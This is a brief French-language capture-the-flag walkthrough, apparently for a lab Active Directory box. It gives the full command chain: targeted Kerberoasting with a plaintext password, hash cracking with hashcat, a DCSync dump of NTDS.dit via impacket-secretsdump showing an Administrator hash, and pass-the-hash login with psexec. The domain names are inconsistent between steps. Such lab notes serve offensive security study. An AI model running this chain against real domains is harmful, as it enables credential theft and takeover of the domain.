Identifier les droits

1. DS-Replication-Get-change-All
2. DS-Replication-Get-change

Récupération du TGS du user ayant les droits sur la délégation de replication AD
```
python3 targetedKerberoast.py --dc-ip 10.129.41.212 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

Crack du hash 
```
hashcat -m 13100 -a 0 hash_ethan2 /usr/share/wordlists/rockyou.txt
```

Récupération des hash NTDS.dit
```bash 
impacket-secretsdump 'administration.htb'/'ethan':'limpbizkit'@'10.129.41.212'

Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
```

Connection sur la machine cible 
```bash 
impacket-psexec baby.vl/Administrator@10.129.41.212 -hashes 'aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e' 
```
